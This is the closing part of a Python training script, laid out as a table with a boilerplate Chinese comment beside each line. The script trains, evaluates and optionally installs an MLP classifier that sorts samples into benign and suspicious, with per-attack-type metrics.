| L0439 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>    val_idx, test_idx = train_test_split(temp_idx, test_size=0.5, random_state=args.seed, stratify=labels[temp_idx])</code> |
| L0440 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0441 | 计算并保存 &#96;device&#96;（device），供后续逻辑使用，当前位于函数 main。 | <code>    device = torch.device("cuda" if torch.cuda.is_available() else "cpu")</code> |
| L0442 | 计算并保存 &#96;model&#96;（模型），供后续逻辑使用，当前位于函数 main。 | <code>    model = MLP(X.shape[1]).to(device)</code> |
| L0443 | 判断条件是否成立，成立时进入对应处理分支，当前位于函数 main。 | <code>    if base_model_path.exists():</code> |
| L0444 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>        model.load_state_dict(torch.load(base_model_path, map_location=device))</code> |
| L0445 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0446 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>    pos_count = float(np.sum(labels[train_idx] == 1))</code> |
| L0447 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>    neg_count = float(np.sum(labels[train_idx] == 0))</code> |
| L0448 | 计算并保存 &#96;pos_weight&#96;（posweight），供后续逻辑使用，当前位于函数 main。 | <code>    pos_weight = torch.tensor([neg_count / max(pos_count, 1.0)], dtype=torch.float32).to(device)</code> |
| L0449 | 计算并保存 &#96;criterion&#96;（criterion），供后续逻辑使用，当前位于函数 main。 | <code>    criterion = nn.BCEWithLogitsLoss(pos_weight=pos_weight)</code> |
| L0450 | 计算并保存 &#96;optimizer&#96;（optimizer），供后续逻辑使用，当前位于函数 main。 | <code>    optimizer = torch.optim.Adam(model.parameters(), lr=args.learning_rate, weight_decay=1e-5)</code> |
| L0451 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0452 | 计算并保存 &#96;train_ds&#96;（训练ds），供后续逻辑使用，当前位于函数 main。 | <code>    train_ds = TensorDataset(torch.tensor(X[train_idx]), torch.tensor(labels[train_idx]).view(-1, 1))</code> |
| L0453 | 计算并保存 &#96;train_loader&#96;（训练loader），供后续逻辑使用，当前位于函数 main。 | <code>    train_loader = DataLoader(train_ds, batch_size=args.batch_size, shuffle=True)</code> |
| L0454 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0455 | 计算并保存 &#96;X_val&#96;（Xval），供后续逻辑使用，当前位于函数 main。 | <code>    X_val = torch.tensor(X[val_idx], dtype=torch.float32).to(device)</code> |
| L0456 | 计算并保存 &#96;y_val&#96;（yval），供后续逻辑使用，当前位于函数 main。 | <code>    y_val = labels[val_idx]</code> |
| L0457 | 计算并保存 &#96;best_state&#96;（beststate），供后续逻辑使用，当前位于函数 main。 | <code>    best_state = None</code> |
| L0458 | 计算并保存 &#96;best_f1&#96;（bestf1），供后续逻辑使用，当前位于函数 main。 | <code>    best_f1 = -1.0</code> |
| L0459 | 计算并保存 &#96;history&#96;（history），供后续逻辑使用，当前位于函数 main。 | <code>    history = []</code> |
| L0460 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0461 | 遍历集合中的数据项并逐项处理，当前位于函数 main。 | <code>    for epoch in range(1, args.epochs + 1):</code> |
| L0462 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>        model.train()</code> |
| L0463 | 计算并保存 &#96;losses&#96;（losses），供后续逻辑使用，当前位于函数 main。 | <code>        losses = []</code> |
| L0464 | 遍历集合中的数据项并逐项处理，当前位于函数 main。 | <code>        for xb, yb in train_loader:</code> |
| L0465 | 计算并保存 &#96;xb&#96;（xb），供后续逻辑使用，当前位于函数 main。 | <code>            xb = xb.to(device)</code> |
| L0466 | 计算并保存 &#96;yb&#96;（yb），供后续逻辑使用，当前位于函数 main。 | <code>            yb = yb.to(device)</code> |
| L0467 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>            optimizer.zero_grad(set_to_none=True)</code> |
| L0468 | 计算并保存 &#96;logits&#96;（logits），供后续逻辑使用，当前位于函数 main。 | <code>            logits = model(xb)</code> |
| L0469 | 计算并保存 &#96;loss&#96;（loss），供后续逻辑使用，当前位于函数 main。 | <code>            loss = criterion(logits, yb)</code> |
| L0470 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>            loss.backward()</code> |
| L0471 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>            optimizer.step()</code> |
| L0472 | 把当前结果加入集合，供后续聚合、排序或返回，当前位于函数 main。 | <code>            losses.append(float(loss.detach().cpu().item()))</code> |
| L0473 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0474 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>        model.eval()</code> |
| L0475 | 通过上下文管理器安全打开资源，并在结束后自动释放，当前位于函数 main。 | <code>        with torch.no_grad():</code> |
| L0476 | 计算并保存 &#96;val_scores&#96;（valscores），供后续逻辑使用，当前位于函数 main。 | <code>            val_scores = torch.sigmoid(model(X_val)).detach().cpu().numpy().reshape(-1)</code> |
| L0477 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>        val_metrics, _ = evaluate_scores(y_val.astype(int), val_scores, args.threshold)</code> |
| L0478 | 把当前结果加入集合，供后续聚合、排序或返回，当前位于函数 main。 | <code>        history.append({"epoch": epoch, "loss": float(np.mean(losses)), **val_metrics})</code> |
| L0479 | 判断条件是否成立，成立时进入对应处理分支，当前位于函数 main。 | <code>        if val_metrics["f1"] &gt; best_f1:</code> |
| L0480 | 计算并保存 &#96;best_f1&#96;（bestf1），供后续逻辑使用，当前位于函数 main。 | <code>            best_f1 = val_metrics["f1"]</code> |
| L0481 | 计算并保存 &#96;best_state&#96;（beststate），供后续逻辑使用，当前位于函数 main。 | <code>            best_state = {k: v.detach().cpu().clone() for k, v in model.state_dict().items()}</code> |
| L0482 | 记录运行状态或诊断信息，便于日志排障，当前位于函数 main。 | <code>        print(f"epoch={epoch:03d} loss={np.mean(losses):.6f} val_acc={val_metrics['accuracy']:.4f} val_recall={val_metrics['recall']:.4f} val_f1={val_metrics['f1']:.4f}")</code> |
| L0483 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0484 | 判断条件是否成立，成立时进入对应处理分支，当前位于函数 main。 | <code>    if best_state is not None:</code> |
| L0485 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>        model.load_state_dict(best_state)</code> |
| L0486 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0487 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>    model.eval()</code> |
| L0488 | 通过上下文管理器安全打开资源，并在结束后自动释放，当前位于函数 main。 | <code>    with torch.no_grad():</code> |
| L0489 | 计算并保存 &#96;test_scores&#96;（testscores），供后续逻辑使用，当前位于函数 main。 | <code>        test_scores = torch.sigmoid(model(torch.tensor(X[test_idx], dtype=torch.float32).to(device))).detach().cpu().numpy().reshape(-1)</code> |
| L0490 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>    test_metrics, test_pred = evaluate_scores(labels[test_idx].astype(int), test_scores, args.threshold)</code> |
| L0491 | 计算并保存 &#96;type_rows&#96;（type数据库记录），供后续逻辑使用，当前位于函数 main。 | <code>    type_rows = per_type_metrics(attack_types[test_idx], labels[test_idx].astype(int), test_scores, test_pred)</code> |
| L0492 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0493 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>    torch.save(model.state_dict(), model_output)</code> |
| L0494 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>    feature_df.assign(label=labels.astype(int), attack_type=attack_types).to_csv(run_dir / "synthetic_features.csv", index=False, encoding="utf-8-sig")</code> |
| L0495 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>    write_csv(run_dir / "raw_samples.csv", raw_rows)</code> |
| L0496 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>    write_csv(run_dir / "per_type_metrics.csv", type_rows)</code> |
| L0497 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>    (run_dir / "metrics.json").write_text(json.dumps({"test": test_metrics, "per_type": type_rows, "history": history}, ensure_ascii=False, indent=2), encoding="utf-8")</code> |
| L0498 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>    (run_dir / "classification_report.txt").write_text(</code> |
| L0499 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>        classification_report(labels[test_idx].astype(int), test_pred, target_names=["benign", "suspicious"], digits=4, zero_division=0),</code> |
| L0500 | 计算并保存 &#96;encoding&#96;（encoding），供后续逻辑使用，当前位于函数 main。 | <code>        encoding="utf-8",</code> |
| L0501 | 结束前面开始的字典、列表、参数或表达式结构，当前位于函数 main。 | <code>    )</code> |
| L0502 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0503 | 记录运行状态或诊断信息，便于日志排障，当前位于函数 main。 | <code>    print("=" * 80)</code> |
| L0504 | 记录运行状态或诊断信息，便于日志排障，当前位于函数 main。 | <code>    print("training output:", run_dir)</code> |
| L0505 | 记录运行状态或诊断信息，便于日志排障，当前位于函数 main。 | <code>    print("model output:", model_output)</code> |
| L0506 | 记录运行状态或诊断信息，便于日志排障，当前位于函数 main。 | <code>    print("test metrics:", json.dumps(test_metrics, ensure_ascii=False, indent=2))</code> |
| L0507 | 记录运行状态或诊断信息，便于日志排障，当前位于函数 main。 | <code>    print("per-type success:")</code> |
| L0508 | 遍历集合中的数据项并逐项处理，当前位于函数 main。 | <code>    for row in type_rows:</code> |
| L0509 | 记录运行状态或诊断信息，便于日志排障，当前位于函数 main。 | <code>        print(row)</code> |
| L0510 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0511 | 计算并保存 &#96;ok&#96;（ok），供后续逻辑使用，当前位于函数 main。 | <code>    ok = test_metrics["accuracy"] &gt;= args.min_accuracy and test_metrics["recall"] &gt;= args.min_recall</code> |
| L0512 | 判断条件是否成立，成立时进入对应处理分支，当前位于函数 main。 | <code>    if args.install:</code> |
| L0513 | 判断条件是否成立，成立时进入对应处理分支，当前位于函数 main。 | <code>        if not ok:</code> |
| L0514 | 主动抛出异常，阻止无效或危险状态继续执行，当前位于函数 main。 | <code>            raise RuntimeError(f"Metrics below install gate: accuracy={test_metrics['accuracy']:.4f} recall={test_metrics['recall']:.4f}")</code> |
| L0515 | 计算并保存 &#96;target&#96;（target），供后续逻辑使用，当前位于函数 main。 | <code>        target = PROJECT_ROOT / "models" / "best_mlp.pth"</code> |
| L0516 | 计算并保存 &#96;backup&#96;（backup），供后续逻辑使用，当前位于函数 main。 | <code>        backup = PROJECT_ROOT / "models" / f"best_mlp_legacy_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pth"</code> |
| L0517 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>        shutil.copy2(target, backup)</code> |
| L0518 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>        shutil.copy2(model_output, target)</code> |
| L0519 | 记录运行状态或诊断信息，便于日志排障，当前位于函数 main。 | <code>        print("installed model:", target)</code> |
| L0520 | 记录运行状态或诊断信息，便于日志排障，当前位于函数 main。 | <code>        print("backup model:", backup)</code> |
| L0521 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0522 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0523 | 判断条件是否成立，成立时进入对应处理分支。 | <code>if __name__ == "__main__":</code> |
| L0524 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    main()</code> |
